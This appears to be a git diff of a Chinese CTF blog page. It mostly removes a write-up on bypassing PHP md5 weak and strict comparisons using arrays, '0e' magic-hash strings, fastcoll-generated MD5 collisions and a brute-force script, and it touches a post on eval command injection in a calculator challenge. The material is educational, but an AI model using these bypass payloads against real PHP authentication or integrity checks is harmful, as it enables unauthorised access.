 <p><strong>目录（挂载点或者说盘符）进行了挂载，那么目录（挂载点）就拥有了一个分区。相当于Windows下盘符的一个盘。）</strong></p>
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84.png" alt="2"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/linux/1.png" alt="2"></p>
 <h4 id="有关磁盘空间的命令"><a href="#有关磁盘空间的命令" class="headerlink" title="有关磁盘空间的命令"></a>有关磁盘空间的命令</h4><table>
 <thead>
 <tr>
@@ -1025,127 +1325,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2020/11/26/md5%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/1.jpg">
-      <meta itemprop="name" content="zoey">
-      <meta itemprop="description" content="Hello!">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zoey">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/11/26/md5%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/" class="post-title-link" itemprop="url">md5弱类型比较</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-11-26 18:39:16" itemprop="dateCreated datePublished" datetime="2020-11-26T18:39:16+08:00">2020-11-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-11-29 14:05:09" itemprop="dateModified" datetime="2020-11-29T14:05:09+08:00">2020-11-29</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>6.6k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>6 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php中有两种比较的符号&#x3D;&#x3D;与&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</span><br><span class="line">&#x3D;&#x3D;在进行比较的时候，会先将字符串类型转化成相同，再比较</span><br><span class="line"></span><br><span class="line">PHP中&#x3D;&#x3D;进行比较时候，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。</span><br><span class="line"></span><br><span class="line">特殊例子整数0弱类型比较任何值都是true</span><br><span class="line"></span><br><span class="line">0e开头的字符串弱类型比较值为0</span><br></pre></td></tr></table></figure>
-
-<h2 id="比较"><a href="#比较" class="headerlink" title="==比较"></a>==比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">&#x27;a&#x27;</span>] != $_POST[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">if</span> (md5($_POST[<span class="string">&#x27;a&#x27;</span>]) == md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    	<span class="keyword">else</span></span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;you are wrong&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;请输入不同的a，b值&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p>由于md5或者sha不能加密数组，在加密数组的时候会返回NULL，传入两个数组</p>
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/md5/2.png"></p>
-<p>所以，我们可以传入两个数组</p>
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/md5/5.png" alt="5"></p>
-<h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><p>我们可以传入两个md5加密后是0e开头的字符串</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">  </span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/md5/6.png"></p>
-<h2 id="比较-1"><a href="#比较-1" class="headerlink" title="===比较"></a>===比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">&#x27;a&#x27;</span>] != $_POST[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">if</span> (md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    	<span class="keyword">else</span></span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;you are wrong&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;请输入不同的a，b值&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><p>也可以传入两个数组，但不再适合传入两个0e开头的字符串，因为===是md5的强碰撞，进行了严格的过滤。</p>
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/md5/3.png"></p>
-<h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><p>使用0e绕过失败，现在我们要用用md5加密后相等的两个字符串来绕过过滤。</p>
-<p>如何生成两个不一样的字符串，但是MD5是一样的呢。参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2232">如何用不同的数值构建一样的MD5</a>后，我们可以使用快速MD5碰撞生成器来构建两个MD5一样，但内容完全不一样的字符串。</p>
-<p><a target="_blank" rel="noopener" href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">fastcoll_v1.0.0.5.exe.zip</a>  </p>
-<h4 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h4><p>创建一个文本文件，写入任意的文件内容，命名为ywj.txt （源文件）</p>
-<p>运行fastcoll输出以下参数。-p 是源文件，-o是输出文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p ywj.txt -o 1.txt 2.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/md5/7.png"></p>
-<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>对生产的1.txt和2.txt文件进行测试</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span>(<span class="params">$path</span>)</span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;二进制md5加密 &#x27;</span>. md5( (readmyfile(<span class="string">&quot;1.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&#x27;url编码 &#x27;</span>. urlencode(readmyfile(<span class="string">&quot;1.txt&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;二进制md5加密 &#x27;</span>.md5( (readmyfile(<span class="string">&quot;2.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&#x27;url编码 &#x27;</span>.  urlencode(readmyfile(<span class="string">&quot;2.txt&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">二进制md5加密 8e4ef6c69a337c0de0208455ee69a416</span><br><span class="line"></span><br><span class="line">url编码 1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%A3njn%FD%1A%CB%3A%29Wr%02En%CE%89%9A%E3%8EF%F1%BE%E9%EE3%0E%82%2A%95%23%0D%FA%CE%1C%F2%C4P%C2%B7s%0F%C8t%F28%FAU%AD%2C%EB%1D%D8%D2%00%8C%3B%FCN%C9b4%DB%AC%17%A8%BF%3Fh%84i%F4%1E%B5Q%7B%FC%B9RuJ%60%B4%0D7%F9%F9%00%1E%C1%1B%16%C9M%2A%7D%B2%BBoW%02%7D%8F%7F%C0qT%D0%CF%3A%9DFH%F1%25%AC%DF%FA%C4G%27uW%CFNB%E7%EF%B0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">二进制md5加密 8e4ef6c69a337c0de0208455ee69a416</span><br><span class="line"></span><br><span class="line">url编码 1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%A3njn%FD%1A%CB%3A%29Wr%02En%CE%89%9A%E3%8E%C6%F1%BE%E9%EE3%0E%82%2A%95%23%0D%FA%CE%1C%F2%C4P%C2%B7s%0F%C8t%F28zV%AD%2C%EB%1D%D8%D2%00%8C%3B%FCN%C9%E24%DB%AC%17%A8%BF%3Fh%84i%F4%1E%B5Q%7B%FC%B9RuJ%60%B4%0D%B7%F9%F9%00%1E%C1%1B%16%C9M%2A%7D%B2%BBoW%02%7D%8F%7F%C0qT%D0%CF%3A%1DFH%F1%25%AC%DF%FA%C4G%27uW%CF%CEB%E7%EF%B0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>可以看到，1.txt和2.txt文件二进制md5加密后的结果完全相同。由于1.txt和2.txt文件中含有不可见字符，所以需要将其url编码后使用。可以看到url编码后的两个字符串不完全相同，满足我们输入两个不同参数的需要。</p>
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/md5/4.png"></p>
-<p>当题目限制不能传入数组，只能传入字符串时，如下例题，就只能采用解法2.</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">string</span>)$_GET[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_GET[<span class="string">&#x27;a&#x27;</span>])===md5($_GET[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;you are right&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;you are wrong&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>); </span><br><span class="line">$string_1 = $_GET[<span class="string">&#x27;str1&#x27;</span>]; </span><br><span class="line">$string_2 = $_GET[<span class="string">&#x27;str2&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;param1&#x27;</span>]!==$_GET[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_GET[<span class="string">&#x27;param1&#x27;</span>])===md5($_GET[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_numeric($string_1))&#123; </span><br><span class="line">            $md5_1 = md5($string_1); </span><br><span class="line">            $md5_2 = md5($string_2); </span><br><span class="line">            <span class="keyword">if</span>($md5_1 != $md5_2)&#123; </span><br><span class="line">                $a = strtr($md5_1, <span class="string">&#x27;cxhp&#x27;</span>, <span class="string">&#x27;0123&#x27;</span>); </span><br><span class="line">                $b = strtr($md5_2, <span class="string">&#x27;cxhp&#x27;</span>, <span class="string">&#x27;0123&#x27;</span>); </span><br><span class="line">                <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> $flag;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;md5 is wrong&quot;</span>); </span><br><span class="line">            &#125;</span><br><span class="line">            &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;str1 not number&#x27;</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="strtr-函数"><a href="#strtr-函数" class="headerlink" title="strtr()函数"></a>strtr()函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">strtr() 函数转换字符串中特定的字符。</span><br><span class="line">把字符串中的字符&quot;ia&quot;替换为&quot;eo&quot;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo strtr(&quot;Hilla Warld&quot;,&quot;ia&quot;,&quot;eo&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;Hello world</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$arr &#x3D; array(&quot;Hello&quot; &#x3D;&gt; &quot;Hi&quot;, &quot;world&quot; &#x3D;&gt; &quot;earth&quot;);</span><br><span class="line">echo strtr(&quot;Hello world&quot;,$arr);</span><br><span class="line">?&gt;</span><br><span class="line"> &#x2F;&#x2F;Hi,earth</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/md5/8.png"></p>
-<p>要求传入四个参数，首先param1===param2,因为没有别的限制，所以我们可以传入两个数组。<br>对于是str1和str2，首先str1只能是数字，因为最后要让$a == $b,没有进行严格的过滤，所以可以想到传入两个0e开头的字符串，但是因为$md5_1!=$md5_2,所以要找一个md5加密后ce开头的字符串，这样经过strtr函数时会将ce替换为0e。</p>
-<h3 id="构造脚本"><a href="#构造脚本" class="headerlink" title="构造脚本"></a>构造脚本</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$count= <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">1</span>; $i &lt;= <span class="number">100000000</span>; $i++) &#123;</span><br><span class="line">   $md5 = strtr(md5($i),<span class="string">&#x27;cxhp&#x27;</span>, <span class="string">&#x27;0123&#x27;</span>);</span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^0e\d+$/&#x27;</span>, $md5)) &#123;</span><br><span class="line">       <span class="keyword">echo</span> $i .<span class="string">&quot; &quot;</span> . md5($i) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">       $count++;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> ($count == <span class="number">2</span>) &#123;</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//2120624 0e85776838554cc1775842c212686416</span></span><br><span class="line"><span class="number">9081940</span> <span class="number">0e9523</span>c2c4430c555306879508688312</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/md5/9.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2020/11/10/%E7%AE%80%E5%8D%95%E8%AE%A1%E7%AE%97%E5%99%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1177,7 +1356,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-01-19 00:44:32" itemprop="dateModified" datetime="2021-01-19T00:44:32+08:00">2021-01-19</time>
+                <time title="修改时间：2021-03-21 16:32:18" itemprop="dateModified" datetime="2021-03-21T16:32:18+08:00">2021-03-21</time>
               </span>
 
           <br>
@@ -1215,21 +1394,21 @@
 
 <p>通过修改$go的值执行eval函数</p>
 <p>首先执行phpinfo()</p>
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/phpinfo().png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/1.png"></p>
 <p>可以看到，我们只要在$go 后面添加and+执行语句，eval就可以执行该命令。</p>
 <p>但是此函数不可在题目上进行测试，因为题目过滤了php.</p>
 <p>在php网站跟目录添加一个flag文件进行测试。</p>
 <p>我们可以对该flag文件进行读取并输出</p>
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/14.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/2.png"></p>
 <p>可以看到成功输出文件内容。</p>
 <p>但是，题目中过滤了va，所以不能使用var_dump这个函数。想到另一个输出函数print_r</p>
-<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/15.png"></p>
